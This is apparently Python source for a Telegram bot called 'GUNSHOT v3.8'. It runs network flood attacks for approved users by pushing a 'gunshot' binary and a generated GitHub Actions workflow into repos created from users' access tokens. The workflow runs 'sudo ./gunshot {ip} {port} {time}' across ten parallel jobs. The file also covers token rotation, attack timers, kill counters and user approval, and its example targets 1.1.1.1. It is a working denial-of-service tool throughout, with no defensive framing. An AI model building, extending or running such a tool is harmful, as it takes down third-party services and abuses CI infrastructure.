import os
import json
import logging
import time
import uuid
import asyncio
import traceback
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes, MessageHandler,
    filters, ConversationHandler, CallbackQueryHandler
)
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== STORAGE =====
DATA_DIR = os.environ.get("DATA_DIR", "data")
os.makedirs(DATA_DIR, exist_ok=True)

def data_path(filename):
    return os.path.join(DATA_DIR, filename)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
active_attacks = {}
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
attack_counters = {}
current_token_index = 0

# ===== SAFE FILE OPS =====
def load_json(filename, default=None):
    try:
        p = data_path(filename)
        if os.path.exists(p):
            with open(p, 'r') as f:
                return json.load(f)
        return default if default is not None else {}
    except Exception as e:
        logger.error(f"Load {filename} error: {e}")
        return default if default is not None else {}

def save_json(filename, data):
    try:
        with open(data_path(filename), 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save {filename} error: {e}")

# ===== INIT =====
def init_data():
    global owners, github_tokens, approved_users, pending_users, attack_counters
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', [])
    attack_counters = load_json('attack_counters.json', {})

init_data()

# ============================================================
# ===== HELPERS =====
# ============================================================

def progress_bar(progress, total, length=12):
    if total <= 0:
        return "█" * length
    pct = min(1.0, progress / total)
    filled = int(pct * length)
    return "█" * filled + "░" * (length - filled)

def get_token_scopes(token):
    """Get OAuth scopes via direct API call (works reliably)"""
    try:
        resp = requests.get(
            "https://api.github.com/user",
            headers={
                "Authorization": f"token {token}",
                "Accept": "application/vnd.github+json"
            },
            timeout=15
        )
        if resp.status_code != 200:
            return None, None, resp.status_code
        scopes_raw = resp.headers.get("x-oauth-scopes", "")
        scopes = [s.strip() for s in scopes_raw.split(",") if s.strip()]
        login = resp.json().get("login", "unknown")
        return login, scopes, 200
    except Exception as e:
        logger.warning(f"Scope check error: {e}")
        return None, None, 0

def validate_github_token(token):
    """Check token + workflow scope using direct API call"""
    try:
        if not token or len(token) < 20:
            return False, "Token too short", True

        login, scopes, status = get_token_scopes(token)

        if status == 401:
            return False, "Invalid token (401)", True
        if status == 403:
            return False, "Rate limited (403)", False
        if status != 200:
            return False, f"GitHub HTTP {status}", True

        scopes_raw = ", ".join(scopes) if scopes else "none"

        # Check required scopes
        required = ["repo", "workflow"]
        missing = [s for s in required if s not in scopes]

        if missing:
            return False, f"Missing scopes: {', '.join(missing)} | Have: {scopes_raw}", True

        # Optional rate-limit check via PyGithub
        try:
            g = Github(token)
            rate = g.get_rate_limit()
            if rate.core.remaining < 1:
                return False, "Rate limit exhausted", False
        except Exception:
            pass

        return True, login, False

    except requests.exceptions.Timeout:
        return False, "GitHub timeout", True
    except Exception as e:
        return False, f"Error: {str(e)[:60]}", True

def auto_remove_expired():
    global github_tokens
    if not github_tokens:
        return 0
    removed = 0
    valid = []
    for td in github_tokens:
        token = td.get('token')
        if not token:
            removed += 1
            continue
        is_valid, info, should_remove = validate_github_token(token)
        if is_valid:
            td['username'] = info
            valid.append(td)
        elif should_remove:
            removed += 1
            logger.warning(f"🗑️ Removed: {token[:10]}... - {info}")
        else:
            td['username'] = info
            valid.append(td)
    if removed > 0:
        github_tokens = valid
        save_json('github_tokens.json', github_tokens)
    return removed

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

# ===== ATTACK STATE =====
def start_attack(attack_id, ip, port, time_val, user_id):
    active_attacks[attack_id] = {
        "ip": ip, "port": port, "time": time_val, "user_id": user_id,
        "start_time": time.time(), "timer_task": None
    }
    save_json('attack_state.json', active_attacks)
    attack_counters[str(user_id)] = attack_counters.get(str(user_id), 0) + 1
    save_json('attack_counters.json', attack_counters)

def finish_attack(attack_id):
    if attack_id in active_attacks:
        t = active_attacks[attack_id].get("timer_task")
        if t and not t.done():
            t.cancel()
        del active_attacks[attack_id]
        save_json('attack_state.json', active_attacks)

# ============================================================
# ===== WORKFLOW TEMPLATE =====
# ============================================================

def build_workflow_yaml(ip, port, time_val, nonce):
    """Unique workflow - commit always different"""
    return f"""name: attack-{nonce}
on:
  push:
    branches: [ main, master ]
  workflow_dispatch:
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10]
    steps:
    - name: Checkout
      uses: actions/checkout@v4
    - name: Verify binary
      run: ls -la && file gunshot || true
    - name: Make executable
      run: chmod +x gunshot
    - name: Fire
      run: sudo ./gunshot {ip} {port} {time_val} 200
      continue-on-error: true
    - name: Nonce {nonce}
      run: echo "nonce={nonce}"
"""

def ensure_workflow_uploaded(repo, ip, port, time_val):
    """Create/update workflow file with UNIQUE content"""
    nonce = uuid.uuid4().hex[:8]
    yml_content = build_workflow_yaml(ip, port, time_val, nonce)
    try:
        existing = repo.get_contents(YML_FILE_PATH)
        repo.update_file(
            YML_FILE_PATH,
            f"attack {ip}:{port} [{nonce}]",
            yml_content,
            existing.sha
        )
        return True, "updated"
    except GithubException as e:
        if e.status == 404:
            try:
                repo.create_file(
                    YML_FILE_PATH,
                    f"attack {ip}:{port} [{nonce}]",
                    yml_content
                )
                return True, "created"
            except GithubException as e2:
                return False, f"create failed: {e2.status} {str(e2.data)[:80]}"
        return False, f"update failed: {e.status} {str(e.data)[:80]}"
    except Exception as e:
        return False, str(e)[:80]

# ============================================================
# ===== BINARY UPLOAD =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Only admins.", parse_mode='HTML')
            return ConversationHandler.END
        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ No tokens. Use /addtoken", parse_mode='HTML')
            return ConversationHandler.END
        await update.message.reply_text(
            "📤 <b>DEPLOY BINARY</b>\n\nSend <code>gunshot</code> file.\n/cancel to abort.",
            parse_mode='HTML'
        )
        return WAITING_FOR_BINARY
    except Exception as e:
        await update.message.reply_text(f"❌ {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied")
            return ConversationHandler.END
        if not update.message.document:
            await update.message.reply_text("❌ Send a file.")
            return WAITING_FOR_BINARY
        file = update.message.document
        fname = (file.file_name or "").lower()
        if not fname.startswith("gunshot"):
            await update.message.reply_text(
                f"❌ File must be named <code>gunshot</code>.\nFound: <code>{file.file_name}</code>",
                parse_mode='HTML'
            )
            return WAITING_FOR_BINARY

        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ No valid tokens.")
            return ConversationHandler.END

        status_msg = await update.message.reply_text("⏳ Downloading binary...")
        file_obj = await file.get_file()
        file_path = f"temp_{file.file_id}.bin"
        await file_obj.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            content = f.read()
        os.remove(file_path)
        size_kb = len(content) // 1024

        await status_msg.edit_text(
            f"📦 Binary: <b>{size_kb} KB</b>\n⏳ Uploading to {len(github_tokens)} repos...",
            parse_mode='HTML'
        )

        success, fail = 0, 0
        results = []
        for td in github_tokens:
            token = td.get('token')
            repo_name = td.get('repo')
            username = td.get('username', '?')
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    ex = repo.get_contents("gunshot")
                    repo.update_file("gunshot", "update binary", content, ex.sha)
                    results.append((username, "✅ updated"))
                    success += 1
                except GithubException as ge:
                    if ge.status == 404:
                        repo.create_file("gunshot", "add binary", content)
                        results.append((username, "✅ created"))
                        success += 1
                    else:
                        results.append((username, f"❌ {ge.status}"))
                        fail += 1
                # Ensure workflow exists
                wf_ok, wf_info = ensure_workflow_uploaded(repo, "0.0.0.0", 1, 1)
                if not wf_ok:
                    logger.warning(f"Workflow init failed @{username}: {wf_info}")
            except Exception as e:
                results.append((username, f"❌ {str(e)[:30]}"))
                fail += 1

        msg = f"<b>✅ BINARY DEPLOY</b>\n📊 OK: {success} | Fail: {fail}\n\n"
        for u, s in results:
            msg += f"@{u}: {s}\n"
        msg += "\n⚠️ <i>Make sure token has 'workflow' scope!</i>"
        await status_msg.edit_text(msg, parse_mode='HTML')
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== TOKEN COMMANDS =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied")
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 <code>/addtoken &lt;token&gt;</code>", parse_mode='HTML')
            return
        token = context.args[0].strip()

        # Progress message
        wait_msg = await update.message.reply_text("🔍 <b>Validating token...</b>", parse_mode='HTML')

        is_valid, info, should_remove = validate_github_token(token)
        if not is_valid:
            await wait_msg.edit_text(
                f"❌ <b>Invalid Token</b>\n\n{info}\n\n"
                f"💡 Token needs <b>repo</b> + <b>workflow</b> scopes.\n"
                f"Create at: https://github.com/settings/tokens/new",
                parse_mode='HTML'
            )
            return

        for t in github_tokens:
            if t.get('token') == token:
                await wait_msg.edit_text("⚠️ Token already exists.")
                return

        await wait_msg.edit_text(f"✅ Token valid: @{info}\n⏳ Creating repo...", parse_mode='HTML')

        g = Github(token)
        user = g.get_user()
        username = user.login

        for t in github_tokens:
            if t.get('username') == username:
                await wait_msg.edit_text(f"⚠️ @{username} already added.")
                return

        repo_name = f"gunshot-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False, auto_init=True)
        time.sleep(3)

        # Init workflow with placeholder
        try:
            repo = g.get_repo(f"{username}/{repo_name}")
            init_yml = """name: idle
on: workflow_dispatch
jobs:
  noop:
    runs-on: ubuntu-latest
    steps:
    - run: echo "waiting"
"""
            repo.create_file(YML_FILE_PATH, "init workflow", init_yml)
        except Exception as e:
            logger.warning(f"Init workflow failed: {e}")

        github_tokens.append({
            'token': token, 'username': username,
            'repo': f"{username}/{repo_name}",
            'added_at': datetime.now().isoformat(),
            'added_by': user_id
        })
        save_json('github_tokens.json', github_tokens)

        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await wait_msg.edit_text(
            f"<b>🔑 TOKEN ADDED</b>\n\n"
            f"👤 @{username}\n"
            f"📁 <code>{repo_name}</code>\n"
            f"📊 Vault: {len(github_tokens)}",
            parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        logger.error(traceback.format_exc())
        try:
            await update.message.reply_text(f"❌ {str(e)[:200]}")
        except:
            pass

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    removed = auto_remove_expired()
    if not github_tokens:
        msg = "📭 Vault empty."
    else:
        msg = f"<b>🔐 TOKENS</b>\n\n"
        for i, t in enumerate(github_tokens, 1):
            short = t['token'][:10] + "…" + t['token'][-4:]
            msg += f"{i}. @{t.get('username','?')} – <code>{short}</code>\n   <code>{t['repo']}</code>\n\n"
        msg += f"📊 Total: {len(github_tokens)}"
        if removed:
            msg += f"\n🧹 Auto-removed: {removed}"
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def mytokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    mine = [t for t in github_tokens if t.get('added_by') == user_id]
    if not mine:
        msg = "📭 No tokens added."
    else:
        msg = "<b>🔑 YOUR TOKENS</b>\n\n"
        for i, t in enumerate(mine, 1):
            short = t['token'][:10] + "…" + t['token'][-4:]
            msg += f"{i}. @{t.get('username','?')} – <code>{short}</code>\n"
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def removetoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await update.message.reply_text("📖 <code>/removetoken &lt;token&gt;</code>", parse_mode='HTML')
        return
    token = context.args[0]
    found = False
    for i, t in enumerate(github_tokens):
        if t.get('token') == token:
            if is_owner(user_id) or t.get('added_by') == user_id:
                github_tokens.pop(i)
                save_json('github_tokens.json', github_tokens)
                found = True
                break
            else:
                await update.message.reply_text("⛔ No permission.")
                return
    msg = f"✅ Removed. Total: {len(github_tokens)}" if found else "❌ Not found."
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def checktokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    removed = auto_remove_expired()
    msg = f"<b>🔍 HEALTH</b>\n\n📊 Total: {len(github_tokens)}\n🧹 Removed: {removed}\n\n"
    for i, t in enumerate(github_tokens, 1):
        valid, info, _ = validate_github_token(t['token'])
        msg += f"{i}. @{t.get('username','?')}: {'✅' if valid else '⚠️ ' + info[:40]}\n"
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def cleartokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    if len(context.args) == 1 and context.args[0].lower() == "confirm":
        n = len(github_tokens)
        github_tokens.clear()
        save_json('github_tokens.json', github_tokens)
        msg = f"🗑️ Cleared {n}."
    else:
        msg = f"⚠️ Use <code>/cleartokens confirm</code> to delete {len(github_tokens)}."
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def usertokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    groups = {}
    for t in github_tokens:
        groups.setdefault(t.get('added_by', '?'), []).append(t)
    if not groups:
        msg = "📭 No tokens."
    else:
        msg = "<b>📊 PER USER</b>\n\n"
        for uid, ts in groups.items():
            msg += f"<code>{uid}</code>: {len(ts)} tokens\n"
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

# ============================================================
# ===== ATTACK =====
# ============================================================

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_token_index
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied")
            return
        if len(context.args) != 3:
            await update.message.reply_text(
                "📖 <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>",
                parse_mode='HTML'
            )
            return
        ip, port_s, time_s = context.args
        try:
            port = int(port_s); time_val = int(time_s)
        except:
            await update.message.reply_text("❌ Numbers only.")
            return
        if not (1 <= port <= 65535):
            await update.message.reply_text("❌ Port 1–65535.")
            return
        if not (5 <= time_val <= 7200):
            await update.message.reply_text("❌ Time 5–7200s.")
            return

        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action='typing')
        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ No tokens.")
            return

        total = len(github_tokens)
        valid_token = None
        last_error = None
        attempts_log = []

        for i in range(total):
            idx = (current_token_index + i) % total
            cand = github_tokens[idx]
            uname = cand.get('username', '?')
            try:
                logger.info(f"🔄 Try {idx+1}/{total}: @{uname}")
                g = Github(cand['token'])
                repo = g.get_repo(cand['repo'])

                # Check binary
                try:
                    repo.get_contents("gunshot")
                except Exception:
                    last_error = f"gunshot missing in {cand['repo']}"
                    attempts_log.append(f"@{uname}: ❌ binary missing")
                    logger.warning(last_error)
                    continue

                # Upload/update workflow with UNIQUE content
                ok, info = ensure_workflow_uploaded(repo, ip, port, time_val)
                if not ok:
                    last_error = f"workflow fail: {info}"
                    attempts_log.append(f"@{uname}: ❌ {info}")
                    logger.warning(last_error)
                    continue

                logger.info(f"✅ Triggered on @{uname}")
                attempts_log.append(f"@{uname}: ✅ triggered")
                current_token_index = (idx + 1) % total
                valid_token = cand
                break

            except GithubException as e:
                last_error = f"GH {e.status}: {str(e.data)[:80]}"
                attempts_log.append(f"@{uname}: ❌ {e.status}")
                logger.warning(last_error)
                if e.status in (401, 404):
                    github_tokens.pop(idx)
                    save_json('github_tokens.json', github_tokens)
                    total = len(github_tokens)
                    if total == 0:
                        break
                    current_token_index = current_token_index % total
                continue
            except Exception as e:
                last_error = str(e)[:100]
                attempts_log.append(f"@{uname}: ❌ {last_error}")
                continue

        if not valid_token:
            msg = f"❌ <b>ALL TOKENS FAILED</b>\n\n"
            msg += "\n".join(attempts_log[-5:])
            msg += f"\n\nLast: <code>{last_error}</code>"
            msg += "\n\n💡 Check: token has <b>workflow</b> scope?"
            await update.message.reply_text(msg, parse_mode='HTML')
            return

        attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
        start_attack(attack_id, ip, port, time_val, user_id)

        async def auto_finish():
            await asyncio.sleep(time_val + 10)
            finish_attack(attack_id)
        task = asyncio.create_task(auto_finish())
        active_attacks[attack_id]["timer_task"] = task

        threat = "🟢 MODERATE" if time_val <= 60 else ("🟡 HIGH" if time_val <= 300 else "🔴 CRITICAL")
        msg = (
            f"<b>🔫 GUNSHOT DEPLOYED</b>\n\n"
            f"<b>Target</b>   : <code>{ip}:{port}</code>\n"
            f"<b>Duration</b> : <code>{time_val}s</code>\n"
            f"<b>Threat</b>   : {threat}\n"
            f"<b>Token</b>    : @{valid_token['username']}\n"
            f"<b>Repo</b>     : <code>{valid_token['repo']}</code>\n"
            f"<b>ID</b>       : <code>{attack_id}</code>\n\n"
            f"<i>Shot #{attack_counters.get(str(user_id), 0)}</i>\n\n"
            f"👁️ Watch: <a href='https://github.com/{valid_token['repo']}/actions'>Actions tab</a>"
        )
        keyboard = [
            [InlineKeyboardButton("🛑 Terminate", callback_data="stop")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
        ]
        await update.message.reply_text(
            msg, parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.error(traceback.format_exc())
        await update.message.reply_text(f"❌ {str(e)[:200]}")

# ============================================================
# ===== STATUS / START / STOP / HELP / ABOUT =====
# ============================================================

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    if not active_attacks:
        text = "<b>📡 STANDBY</b>\n\nStatus: 🟢 IDLE"
    else:
        text = f"<b>📡 ACTIVE ({len(active_attacks)})</b>\n\n"
        idx = 1
        for aid, d in active_attacks.items():
            el = int(time.time() - d['start_time'])
            bar = progress_bar(el, d['time'])
            text += f"{idx}. <code>[{bar}]</code> {el}s/{d['time']}s\n   <code>{d['ip']}:{d['port']}</code>\n\n"
            idx += 1
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "NoUsername"
    total = sum(attack_counters.values())
    mine = attack_counters.get(str(user_id), 0)

    if can_attack(user_id):
        role = "👑 OWNER" if is_owner(user_id) else "✅ APPROVED"
        keyboard = [
            [InlineKeyboardButton("🚀 Launch", callback_data="attack_help")],
            [InlineKeyboardButton("📡 Status", callback_data="status")],
            [InlineKeyboardButton("🛑 Abort", callback_data="stop")],
        ]
        if is_owner(user_id):
            keyboard.append([InlineKeyboardButton("⚙️ Admin", callback_data="admin_panel")])
        keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help_menu")])
        keyboard.append([InlineKeyboardButton("ℹ️ About", callback_data="about_menu")])
        msg = (
            f"<b>🔫 GUNSHOT v3.8</b>\n\n"
            f"👤 @{username}\n"
            f"👑 {role}\n"
            f"🔄 Tokens: {len(github_tokens)}\n"
            f"💥 Kills: {mine}\n"
            f"🌐 Global: {total}"
        )
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
            pending_users.append({
                "user_id": user_id, "username": username,
                "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            save_json('pending_users.json', pending_users)
            for oid in owners.keys():
                try:
                    await context.bot.send_message(
                        int(oid),
                        f"📥 <b>Access Request</b>\n👤 @{username}\n🆔 <code>{user_id}</code>\nUse: <code>/approve {user_id} 7</code>",
                        parse_mode='HTML'
                    )
                except:
                    pass
        await update.message.reply_text(
            "⛔ <b>Access Denied</b>\nRequest sent to admin.", parse_mode='HTML'
        )

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    if not active_attacks:
        msg = "✅ No active shots."
    else:
        n = len(active_attacks)
        for aid in list(active_attacks.keys()):
            finish_attack(aid)
        msg = f"🛑 Terminated {n}."
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<b>🔫 COMMANDS</b>\n\n"
        "<b>⚔️ STRIKE</b>\n"
        "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n"
        "<code>/status</code> <code>/stop</code>\n\n"
        "<b>🔧 TOKENS</b>\n"
        "<code>/addtoken</code> <code>/mytokens</code> <code>/removetoken</code>\n\n"
        "<b>🔧 ADMIN</b>\n"
        "<code>/tokens</code> <code>/usertokens</code> <code>/checktokens</code>\n"
        "<code>/cleartokens</code> <code>/approve</code> <code>/remove</code>\n"
        "<code>/users</code> <code>/pending</code> <code>/broadcast</code>\n"
        "<code>/binary_upload</code>\n\n"
        "<b>ℹ️ UTILITY</b>\n"
        "<code>/start</code> <code>/myid</code> <code>/about</code>"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(
        f"<b>🆔</b>\n<code>{update.effective_user.id}</code>",
        parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<b>🔫 GUNSHOT v3.8</b>\n\n"
        "Python 3.11 + PTB + PyGithub\n"
        "Hosting: Railway\n"
        "Motto: <b>\"Silence. Precision. Power.\"</b>"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

# ============================================================
# ===== ADMIN =====
# ============================================================

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    if len(context.args) != 2:
        await update.message.reply_text("📖 <code>/approve &lt;user_id&gt; &lt;days&gt;</code>", parse_mode='HTML')
        return
    try:
        tid = int(context.args[0]); days = int(context.args[1])
    except:
        await update.message.reply_text("❌ Numbers only.")
        return
    pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(tid)]
    save_json('pending_users.json', pending_users)
    expiry = "LIFETIME" if days == 0 else time.time() + days * 86400
    approved_users[str(tid)] = {"added_by": user_id, "expiry": expiry, "days": days}
    save_json('approved_users.json', approved_users)
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(
        f"✅ <code>{tid}</code> approved for {days}d.",
        parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard)
    )
    try:
        await context.bot.send_message(tid, "✅ Access granted! Use /start", parse_mode='HTML')
    except:
        pass

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    if len(context.args) != 1:
        await update.message.reply_text("📖 <code>/remove &lt;user_id&gt;</code>", parse_mode='HTML')
        return
    try:
        tid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Number only.")
        return
    if str(tid) in approved_users:
        del approved_users[str(tid)]
        save_json('approved_users.json', approved_users)
        msg = f"✅ Removed {tid}."
    else:
        msg = "❌ Not found."
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    if not approved_users:
        msg = "📭 No approved users."
    else:
        msg = "<b>👥 USERS</b>\n\n"
        for uid, d in approved_users.items():
            msg += f"<code>{uid}</code> – {d.get('days','?')}d – 💥{attack_counters.get(uid,0)}\n"
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    if not pending_users:
        msg = "📭 No pending."
    else:
        msg = "<b>⏳ PENDING</b>\n\n"
        for u in pending_users:
            msg += f"<code>{u.get('user_id')}</code> – @{u.get('username')}\n"
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    if not context.args:
        await update.message.reply_text("📖 <code>/broadcast &lt;msg&gt;</code>", parse_mode='HTML')
        return
    msg = " ".join(context.args)
    sent = 0
    for uid in list(owners.keys()) + list(approved_users.keys()):
        try:
            await context.bot.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{msg}", parse_mode='HTML')
            sent += 1
        except:
            pass
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(f"✅ Sent to {sent}.", parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Access Denied")
        return
    if len(context.args) != 1:
        await update.message.reply_text("📖 <code>/maintenance &lt;on/off&gt;</code>", parse_mode='HTML')
        return
    mode = context.args[0].lower()
    save_json('maintenance.json', {"maintenance": mode == "on"})
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(
        f"🔧 Maintenance {'ON' if mode=='on' else 'OFF'}.",
        parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ============================================================
# ===== CALLBACKS =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    async def send(text, kb=None):
        try:
            await query.edit_message_text(text, parse_mode='HTML', reply_markup=kb, disable_web_page_preview=True)
        except:
            try:
                await query.message.reply_text(text, parse_mode='HTML', reply_markup=kb, disable_web_page_preview=True)
            except:
                pass

    if data == "attack_help":
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await send(
            "<b>🚀 LAUNCH</b>\n\n<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n\n"
            "Example: <code>/attack 1.1.1.1 443 60</code>", kb
        )

